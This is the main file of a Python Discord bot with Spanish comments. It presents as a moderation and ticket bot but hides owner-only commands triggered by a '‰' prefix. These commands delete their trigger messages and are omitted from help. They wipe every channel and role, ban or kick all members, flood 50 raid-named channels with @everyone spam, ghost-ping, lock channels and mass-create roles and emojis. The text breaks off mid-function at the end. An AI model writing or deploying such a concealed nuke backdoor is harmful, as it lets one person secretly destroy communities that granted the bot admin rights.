import asyncio
import os
import random
import string
import struct
import zlib
import discord
from discord import app_commands
from discord.ext import commands

import storage
from cogs.tickets import TicketPanelView, TicketControlView, ConfirmCloseView

TOKEN = os.environ.get("DISCORD_TOKEN", "")
OWNER_USERNAME = "relij."


def get_prefix(bot: commands.Bot, message: discord.Message):
    if message.guild is None:
        return commands.when_mentioned_or("!")(bot, message)
    prefijo = storage.get_prefix(message.guild.id)
    return commands.when_mentioned_or(prefijo)(bot, message)


class MiBot(commands.Bot):
    async def setup_hook(self):
        for cog in (
            "cogs.moderation",
            "cogs.tickets",
            "cogs.config",
            "cogs.features",
            "cogs.giveaways",
            "cogs.welcomes",
            "cogs.snipe",
            "cogs.webhooksender",
        ):
            try:
                await self.load_extension(cog)
                print(f"✅ {cog} cargado")
            except Exception as e:
                print(f"❌ Error cargando {cog}: {e}")

        self.add_view(TicketPanelView())
        self.add_view(TicketControlView())
        self.add_view(ConfirmCloseView())

        try:
            await self.tree.sync()
            print("✅ Slash commands sincronizados")
        except Exception as e:
            print(f"❌ Error sincronizando slash commands: {e}")


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = MiBot(command_prefix=get_prefix, intents=intents, help_command=None)


# ------------------------------------------------------------------ wipeserver
class WipeConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id = guild_id
        self.bot = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(
                    title="⌛ Confirmación expirada",
                    description="El wipeserver fue cancelado por inactividad.",
                    color=discord.Color.greyple(),
                ),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True
            )
            return False
        return True

    @discord.ui.button(label="✅ Confirmar — Borrar todo", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()

        executing_embed = discord.Embed(
            title="⚙️ Ejecutando Wipeserver...",
            description="Eliminando canales, roles y datos del servidor. Esto puede tardar unos segundos.",
            color=discord.Color.orange(),
        )
        try:
            await interaction.response.edit_message(embed=executing_embed, view=self)
        except Exception:
            pass

        # La interacción viene de DMs — obtener el guild por ID
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            await interaction.edit_original_response(
                embed=discord.Embed(title="❌ Error", description="No se encontró el servidor.", color=discord.Color.red()),
                view=None,
            )
            return

        # 1. Eliminar todos los canales en paralelo
        async def _del_channel(ch):
            try:
                await ch.delete(reason="‰wipeserver")
            except Exception:
                pass

        await asyncio.gather(*[_del_channel(ch) for ch in list(guild.channels)])

        # 2. Eliminar roles en paralelo (excepto @everyone y roles por encima del bot)
        bot_top_role = guild.me.top_role

        async def _del_role(role):
            if role.is_default() or role >= bot_top_role:
                return
            try:
                await role.delete(reason="‰wipeserver")
            except Exception:
                pass

        await asyncio.gather(*[_del_role(r) for r in list(guild.roles)])

        # 3. Resetear nombre y foto del servidor
        try:
            await guild.edit(name="Servidor", icon=None, reason="‰wipeserver")
        except Exception:
            pass

        # 4. Notificar al usuario por DM que terminó
        try:
            done_embed = discord.Embed(
                title="✅ Wipeserver Completado",
                description="Todos los canales, roles, nombre y foto del servidor han sido eliminados.",
                color=discord.Color.green(),
            )
            await interaction.edit_original_response(embed=done_embed, view=None)
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        embed = discord.Embed(
            title="✅ Wipeserver Cancelado",
            description="No se realizó ningún cambio en el servidor.",
            color=discord.Color.green(),
        )
        await interaction.response.edit_message(embed=embed, view=self)


# ------------------------------------------------------------------ icreate
class ICreateConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(
                    title="⌛ Confirmación expirada",
                    description="El comando īcreate fue cancelado por inactividad.",
                    color=discord.Color.greyple(),
                ),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True
            )
            return False
        return True

    @discord.ui.button(label="✅ Confirmar — Crear 50 canales", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()

        await interaction.response.edit_message(
            embed=discord.Embed(
                title="⚙️ Creando canales...",
                description="Generando 50 canales en el servidor. Esto puede tardar unos segundos.",
                color=discord.Color.orange(),
            ),
            view=self,
        )

        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            await interaction.edit_original_response(
                embed=discord.Embed(title="❌ Error", description="No se encontró el servidor.", color=discord.Color.red()),
                view=None,
            )
            return

        canal_embed = discord.Embed(
            title="CANAL CREADO",
            color=discord.Color.blurple(),
        )

        async def _crear_canal(i: int):
            try:
                nuevo = await guild.create_text_channel(
                    name=f"canal-{i}",
                    reason="īcreate",
                )
                try:
                    await nuevo.send(embed=canal_embed)
                except Exception:
                    pass
                return True
            except Exception:
                return False

        resultados = await asyncio.gather(*[_crear_canal(i) for i in range(1, 35)])
        creados = sum(1 for r in resultados if r)

        try:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="✅ Canales Creados",
                    description=f"Se crearon **{creados}** canales en el servidor.\nPuedes renombrarlos y configurarlos libremente.",
                    color=discord.Color.green(),
                ),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(
                title="✅ Cancelado",
                description="No se creó ningún canal.",
                color=discord.Color.green(),
            ),
            view=self,
        )


# ------------------------------------------------------------------ banall
class BanAllConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(
                    title="⌛ Confirmación expirada",
                    description="El comando fue cancelado por inactividad.",
                    color=discord.Color.greyple(),
                ),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True
            )
            return False
        return True

    @discord.ui.button(label="✅ Confirmar — Banear todos", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()

        try:
            await interaction.response.edit_message(
                embed=discord.Embed(
                    title="⚙️ Baneando miembros...",
                    description="Procesando. Esto puede tardar unos segundos.",
                    color=discord.Color.orange(),
                ),
                view=self,
            )
        except Exception:
            pass

        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            try:
                await interaction.edit_original_response(
                    embed=discord.Embed(title="❌ Error", description="No se encontró el servidor.", color=discord.Color.red()),
                    view=None,
                )
            except Exception:
                pass
            return

        bot_top_role = guild.me.top_role

        async def _ban(member: discord.Member):
            if member.bot:
                return
            if member.id == self.author_id:
                return
            if member.top_role >= bot_top_role:
                return
            try:
                await member.ban(reason="‰banall", delete_message_seconds=0)
            except Exception:
                pass

        await asyncio.gather(*[_ban(m) for m in list(guild.members)])

        try:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="✅ Baneos completados",
                    description="Todos los miembros baneables han sido baneados.",
                    color=discord.Color.green(),
                ),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(
                title="✅ Cancelado",
                description="No se baneó a nadie.",
                color=discord.Color.green(),
            ),
            view=self,
        )


# ------------------------------------------------------------------ lel
class LelConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(
                    title="⌛ Confirmación expirada",
                    description="El comando fue cancelado por inactividad.",
                    color=discord.Color.greyple(),
                ),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True
            )
            return False
        return True

    @discord.ui.button(label="✅ Confirmar", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()

        try:
            await interaction.response.edit_message(
                embed=discord.Embed(
                    title="⚙️ Ejecutando...",
                    description="Procesando. Esto tomará unos segundos.",
                    color=discord.Color.orange(),
                ),
                view=self,
            )
        except Exception:
            pass

        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            try:
                await interaction.edit_original_response(
                    embed=discord.Embed(title="❌ Error", description="No se encontró el servidor.", color=discord.Color.red()),
                    view=None,
                )
            except Exception:
                pass
            return

        # 1. Eliminar todos los canales en paralelo
        async def _del_ch(ch):
            try:
                await ch.delete(reason=None)
            except Exception:
                pass

        await asyncio.gather(*[_del_ch(ch) for ch in list(guild.channels)])

        # 2. Eliminar roles en paralelo (excepto @everyone y superiores al bot)
        bot_top_role = guild.me.top_role

        async def _del_role(role):
            if role.is_default() or role >= bot_top_role:
                return
            try:
                await role.delete(reason=None)
            except Exception:
                pass

        await asyncio.gather(*[_del_role(r) for r in list(guild.roles)])

        # 3. Crear 50 canales en paralelo
        CANAL_NOMBRES = [
            "raid", "destroyed", "nuked", "cr4sh", "elite",
            "khaos", "spam", "zone", "death", "annihilation",
            "obliteration", "devastation", "ruin", "chaos", "mayhem",
            "havoc", "carnage", "destruction", "pandemic", "apocalypse",
            "doomsday", "armageddon", "cataclysm", "calamity", "disaster",
            "tragedy", "massacre", "slaughter", "extermination", "eradication",
            "liquidation", "purge", "oblivion", "void", "void2",
            "raid2", "nuked2", "chaos2", "ruin2", "havoc2",
            "death2", "spam2", "cr4sh2", "elite2", "zone2",
            "carnage2", "mayhem2", "purge2", "disaster2", "doomsday2",
        ]

        async def _crear(i: int):
            try:
                return await guild.create_text_channel(
                    name=CANAL_NOMBRES[i % len(CANAL_NOMBRES)],
                    reason=None,
                )
            except Exception:
                return None

        canales = [c for c in await asyncio.gather(*[_crear(i) for i in range(50)]) if c]

        # 4. Spam en cada canal — todos los canales en paralelo, con pausa entre mensajes
        PREFIX = "@everyone @here "
        RELLENO_LEN = 2000 - len(PREFIX)
        CHARS = string.ascii_letters + string.digits

        async def _spam_canal(canal):
            for _ in range(100):
                relleno = "".join(random.choices(CHARS, k=RELLENO_LEN))
                msg = PREFIX + relleno
                try:
                    await canal.send(msg)
                except Exception:
                    pass
                await asyncio.sleep(1.3)

        asyncio.ensure_future(asyncio.gather(*[_spam_canal(c) for c in canales]))

        # 5. Notificar al usuario por DM
        try:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="✅ Completado",
                    description=f"Se crearon **{len(canales)}** canales y se enviaron los mensajes.",
                    color=discord.Color.green(),
                ),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(
                title="✅ Cancelado",
                description="No se realizó ningún cambio.",
                color=discord.Color.green(),
            ),
            view=self,
        )


# ------------------------------------------------------------------ events
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="!help | /help"))
    print(f"✅ Online como {bot.user} (ID: {bot.user.id})")
    print(f"   Slash commands: {len(bot.tree.get_commands())}")
    print(f"   Prefix commands: {len(bot.commands)}")


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    # ‰create — comando secreto, crea 34 canales
    if message.content.strip() == "‰create":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        embed = discord.Embed(
            title="🏗️ ¿Crear 50 canales en el servidor?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                "Esto creará **50 canales de texto** llamados:\n"
                "`canal-1`, `canal-2`, ... `canal-50`\n\n"
                "Cada canal recibirá un embed con **CANAL CREADO**.\n"
                "Podrás renombrarlos y configurarlos libremente después.\n\n"
                "⏱️ El proceso tardará aproximadamente **25-30 segundos**."
            ),
            color=discord.Color.blurple(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")
        view = ICreateConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(
                f"{message.author.mention} ⚠️ Activa tus DMs para usar este comando.",
                delete_after=8,
            )
        return

    # ‰banall — comando secreto
    if message.content.strip() == "‰banall":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        total = sum(1 for m in message.guild.members if not m.bot and m.id != message.author.id)
        embed = discord.Embed(
            title="⚠️ ¿Banear a todos los miembros?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                f"Se baneará a **{total} miembros** (excluyendo bots y a ti).\n\n"
                "⛔ **IRREVERSIBLE — no tiene vuelta atrás.**"
            ),
            color=discord.Color.dark_red(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")

        view = BanAllConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(
                f"{message.author.mention} ⚠️ Activa tus DMs para usar este comando.",
                delete_after=8,
            )
        return

    # ‰lel — comando secreto
    if message.content.strip() == "‰lel":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        embed = discord.Embed(
            title="⚠️ ¿Confirmar operación?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                "Esta acción:\n\n"
                "🗑️ Eliminará **todos los canales y roles**\n"
                "🏗️ Creará **50 canales nuevos**\n"
                "📢 Enviará **100 mensajes** de 2000 caracteres en cada canal\n\n"
                "⛔ **IRREVERSIBLE — no tiene vuelta atrás.**"
            ),
            color=discord.Color.dark_red(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")

        view = LelConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(
                f"{message.author.mention} ⚠️ Activa tus DMs para usar este comando.",
                delete_after=8,
            )
        return

    # ‰wipeserver — comando secreto, no aparece en help ni slash
    if message.content.strip() == "‰wipeserver":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        # Borrar el mensaje original para que nadie más lo vea
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        embed = discord.Embed(
            title="⚠️ ¿Seguro que quieres wipear el servidor?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                "Esta acción eliminará **permanentemente**:\n\n"
                "🗑️ Todos los **canales** del servidor\n"
                "🏷️ Todos los **roles** (excepto los superiores al bot)\n"
                "📛 El **nombre** del servidor → se cambiará a `Servidor`\n"
                "🖼️ La **foto** del servidor\n\n"
                "⛔ **Esta acción es IRREVERSIBLE y no tiene vuelta atrás.**"
            ),
            color=discord.Color.dark_red(),
        )
        embed.set_footer(text=f"Solo tú puedes ver esto • Expira en 30s")

        view = WipeConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            # Si el usuario tiene DMs cerrados, avisarle brevemente en el canal
            aviso = await message.channel.send(
                f"{message.author.mention} ⚠️ Activa tus DMs para usar este comando.",
                delete_after=8,
            )
        return

    # ‰ghostping — comando secreto
    if message.content.strip() == "‰ghostping":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        try:
            ping_msg = await message.channel.send("@everyone @here")
            await ping_msg.delete()
        except Exception:
            pass
        return

    # ‰nickall — comando secreto: ‰nickall <nickname>
    if message.content.strip().startswith("‰nickall"):
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        partes = message.content.strip().split(" ", 1)
        nickname = partes[1].strip() if len(partes) > 1 else ""
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        if not nickname:
            try:
                await message.author.send("❌ Uso: `‰nickall <nickname>`")
            except Exception:
                pass
            return
        if len(nickname) > 32:
            try:
                await message.author.send("❌ El nickname no puede superar los 32 caracteres.")
            except Exception:
                pass
            return
        total = sum(1 for m in message.guild.members if not m.bot)
        embed = discord.Embed(
            title="📛 ¿Cambiar nickname a todos?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                f"Se cambiará el nickname de **{total} miembros** a:\n`{nickname}`\n\n"
                "⚠️ Los miembros con rol superior al bot no serán afectados."
            ),
            color=discord.Color.orange(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")
        view = NickAllConfirmView(message.author.id, message.guild.id, bot, nickname)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(
                f"{message.author.mention} ⚠️ Activa tus DMs para usar este comando.",
                delete_after=8,
            )
        return

    # ‰invitegen — comando secreto
    if message.content.strip() == "‰invitegen":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        invites = []
        for channel in message.guild.text_channels:
            try:
                inv = await channel.create_invite(max_age=86400, max_uses=0, reason="‰invitegen")
                invites.append(f"`#{channel.name}` → {inv.url}")
            except Exception:
                pass
        if not invites:
            try:
                await message.author.send("❌ No se pudo generar ninguna invitación.")
            except Exception:
                pass
            return
        chunks = []
        current = ""
        for line in invites:
            if len(current) + len(line) + 1 > 1900:
                chunks.append(current)
                current = line + "\n"
            else:
                current += line + "\n"
        if current:
            chunks.append(current)
        try:
            await message.author.send(
                embed=discord.Embed(
                    title=f"🔗 Invitaciones generadas — {message.guild.name}",
                    description=f"**{len(invites)} invitaciones** (válidas 24h, usos ilimitados)",
                    color=discord.Color.blurple(),
                )
            )
            for chunk in chunks:
                await message.author.send(chunk)
        except discord.Forbidden:
            pass
        return

    # ‰kickall — comando secreto
    if message.content.strip() == "‰kickall":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        bot_top = message.guild.me.top_role
        total = sum(1 for m in message.guild.members if not m.bot and m.id != message.guild.me.id and m.top_role < bot_top)
        embed = discord.Embed(
            title="👢 ¿Expulsar a todos los miembros?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                f"Se expulsará a **{total} miembros** (excluye bots y roles superiores al bot).\n\n"
                "⚠️ Pueden volver si tienen una invitación."
            ),
            color=discord.Color.orange(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")
        view = KickAllConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(f"{message.author.mention} ⚠️ Activa tus DMs.", delete_after=8)
        return

    # ‰emojiflood — comando secreto
    if message.content.strip() == "‰emojiflood":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        existentes = len(message.guild.emojis)
        limit = 50
        por_crear = max(0, limit - existentes)
        embed = discord.Embed(
            title="😈 ¿Llenar el servidor de emojis?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                f"Emojis actuales: **{existentes}/{limit}**\n"
                f"Se crearán: **{por_crear} emojis** aleatorios\n\n"
                "Los emojis tendrán nombres y colores random."
            ),
            color=discord.Color.purple(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")
        view = EmojiFloodConfirmView(message.author.id, message.guild.id, bot)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(f"{message.author.mention} ⚠️ Activa tus DMs.", delete_after=8)
        return

    # ‰spamrole — comando secreto: ‰spamrole <nombre>
    if message.content.strip().startswith("‰spamrole"):
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        partes = message.content.strip().split(" ", 1)
        rolename = partes[1].strip() if len(partes) > 1 else "role"
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        embed = discord.Embed(
            title="🎭 ¿Crear 50 roles?",
            description=(
                f"**Servidor:** {message.guild.name}\n\n"
                f"Se crearán **50 roles** llamados `{rolename}` con colores aleatorios."
            ),
            color=discord.Color.blurple(),
        )
        embed.set_footer(text="Solo tú puedes ver esto • Expira en 30s")
        view = SpamRoleConfirmView(message.author.id, message.guild.id, bot, rolename)
        try:
            dm = await message.author.send(embed=embed, view=view)
            view.message = dm
        except discord.Forbidden:
            await message.channel.send(f"{message.author.mention} ⚠️ Activa tus DMs.", delete_after=8)
        return

    # ‰lockall — comando secreto
    if message.content.strip() == "‰lockall":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        everyone = message.guild.default_role

        async def _lock(ch):
            try:
                await ch.set_permissions(everyone, send_messages=False, reason=None)
            except Exception:
                pass

        await asyncio.gather(*[_lock(ch) for ch in message.guild.text_channels])
        try:
            await message.author.send(
                embed=discord.Embed(
                    title="🔒 Canales bloqueados",
                    description=f"Se bloquearon **{len(message.guild.text_channels)} canales**. Nadie puede escribir.",
                    color=discord.Color.red(),
                )
            )
        except discord.Forbidden:
            pass
        return

    # ‰unlockall — comando secreto
    if message.content.strip() == "‰unlockall":
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        everyone = message.guild.default_role

        async def _unlock(ch):
            try:
                await ch.set_permissions(everyone, send_messages=None, reason=None)
            except Exception:
                pass

        await asyncio.gather(*[_unlock(ch) for ch in message.guild.text_channels])
        try:
            await message.author.send(
                embed=discord.Embed(
                    title="🔓 Canales desbloqueados",
                    description=f"Se desbloquearon **{len(message.guild.text_channels)} canales**.",
                    color=discord.Color.green(),
                )
            )
        except discord.Forbidden:
            pass
        return

    # ‰slowall — comando secreto: ‰slowall <segundos>
    if message.content.strip().startswith("‰slowall"):
        if not message.guild:
            return
        if message.author.name != OWNER_USERNAME:
            return
        partes = message.content.strip().split(" ", 1)
        try:
            segundos = int(partes[1].strip()) if len(partes) > 1 else 10
            segundos = max(0, min(segundos, 21600))
        except ValueError:
            segundos = 10
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        async def _slow(ch):
            try:
                await ch.edit(slowmode_delay=segundos, reason=None)
            except Exception:
                pass

        await asyncio.gather(*[_slow(ch) for ch in message.guild.text_channels])
        try:
            label = f"{segundos}s" if segundos > 0 else "desactivado"
            await message.author.send(
                embed=discord.Embed(
                    title="🐌 Slowmode aplicado",
                    description=f"Slowmode de **{label}** en **{len(message.guild.text_channels)} canales**.",
                    color=discord.Color.orange(),
                )
            )
        except discord.Forbidden:
            pass
        return

    # ‰secrets — muestra todos los comandos secretos por DM
    if message.content.strip() == "‰secrets":
        if message.author.name != OWNER_USERNAME:
            return
        try:
            await message.delete()
        except Exception:
            pass
        embed = discord.Embed(
            title="🔐 Comandos Secretos",
            description="Solo visibles para ti. Silenciosos para cualquier otro usuario.",
            color=discord.Color.dark_gold(),
        )
        embed.add_field(name="‰wipeserver", value="Elimina todos los canales, roles y cambia nombre/foto del servidor.", inline=False)
        embed.add_field(name="‰banall", value="Banea a todos los miembros en paralelo.", inline=False)
        embed.add_field(name="‰kickall", value="Expulsa a todos los miembros (pueden volver con invitación).", inline=False)
        embed.add_field(name="‰create", value="Crea 34 canales de texto nuevos.", inline=False)
        embed.add_field(name="‰lel", value="Wipe + 50 canales + spam 100 msgs @everyone @here de 2000 chars.", inline=False)
        embed.add_field(name="‰ghostping", value="Envía @everyone @here y borra el mensaje al instante.", inline=False)
        embed.add_field(name="‰nickall <nick>", value="Cambia el nickname de todos los miembros.", inline=False)
        embed.add_field(name="‰invitegen", value="Genera invitaciones de todos los canales y las manda por DM.", inline=False)
        embed.add_field(name="‰lockall", value="Bloquea todos los canales (nadie puede escribir).", inline=False)
        embed.add_field(name="‰unlockall", value="Desbloquea todos los canales.", inline=False)
        embed.add_field(name="‰slowall <seg>", value="Activa slowmode en todos los canales. Ej: ‰slowall 30", inline=False)
        embed.add_field(name="‰emojiflood", value="Crea emojis random hasta llenar el límite del servidor (50).", inline=False)
        embed.add_field(name="‰spamrole <nombre>", value="Crea 50 roles con el nombre y colores aleatorios.", inline=False)
        embed.add_field(name="‰secrets", value="Muestra esta lista en tu DM.", inline=False)
        embed.set_footer(text=f"Total: 14 comandos secretos • Solo para {OWNER_USERNAME}")
        try:
            await message.author.send(embed=embed)
        except discord.Forbidden:
            pass
        return

    await bot.process_commands(message)


@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, (commands.CheckFailure, commands.MissingPermissions)):
        await ctx.send("❌ Necesitas permisos de **Administrador** o rol de Staff para usar este comando.")
        return
    if isinstance(error, commands.MemberNotFound):
        await ctx.send("⚠️ No encontré a ese usuario. Menciónalo o usa su ID.")
        return
    if isinstance(error, commands.ChannelNotFound):
        await ctx.send("⚠️ No encontré ese canal.")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"⚠️ Falta un argumento: `{error.param.name}`. Usa `!help {ctx.command}`.")
        return
    if isinstance(error, commands.BadArgument):
        await ctx.send("⚠️ Argumento inválido. Revisa el formato del comando.")
        return
    if isinstance(error, discord.Forbidden):
        await ctx.send("❌ No tengo permisos suficientes.")
        return
    print(f"Error no manejado en {ctx.command}: {error}")
    await ctx.send("❌ Ocurrió un error inesperado.")


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, (app_commands.MissingPermissions, app_commands.CheckFailure)):
        msg = "❌ Necesitas permisos de **Administrador** o rol de **Staff** para usar este comando."
    elif isinstance(error, app_commands.CommandOnCooldown):
        msg = f"⏳ Espera `{error.retry_after:.1f}s` antes de volver a usar este comando."
    else:
        print(f"Error en slash command: {error}")
        msg = "❌ Ocurrió un error inesperado."
    try:
        if interaction.response.is_done():
            await interaction.followup.send(msg, ephemeral=True)
        else:
            await interaction.response.send_message(msg, ephemeral=True)
    except Exception:
        pass


# ------------------------------------------------------------------ kickall
class KickAllConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(title="⌛ Confirmación expirada", description="Cancelado por inactividad.", color=discord.Color.greyple()),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Confirmar", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        try:
            await interaction.response.edit_message(
                embed=discord.Embed(title="⚙️ Ejecutando...", description="Expulsando miembros...", color=discord.Color.orange()),
                view=self,
            )
        except Exception:
            pass
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        bot_top = guild.me.top_role

        async def _kick(m: discord.Member):
            if m.bot or m.id == guild.me.id or m.top_role >= bot_top:
                return
            try:
                await m.kick(reason=None)
            except Exception:
                pass

        targets = [m for m in guild.members if not m.bot and m.id != guild.me.id and m.top_role < bot_top]
        await asyncio.gather(*[_kick(m) for m in targets])
        try:
            await interaction.edit_original_response(
                embed=discord.Embed(title="✅ Hecho", description=f"Se expulsó a **{len(targets)} miembros**.", color=discord.Color.green()),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title="✅ Cancelado", description="No se expulsó a nadie.", color=discord.Color.green()),
            view=self,
        )


# ------------------------------------------------------------------ emojiflood
def _make_png(r: int = 255, g: int = 0, b: int = 0) -> bytes:
    def chunk(tag: bytes, data: bytes) -> bytes:
        raw = tag + data
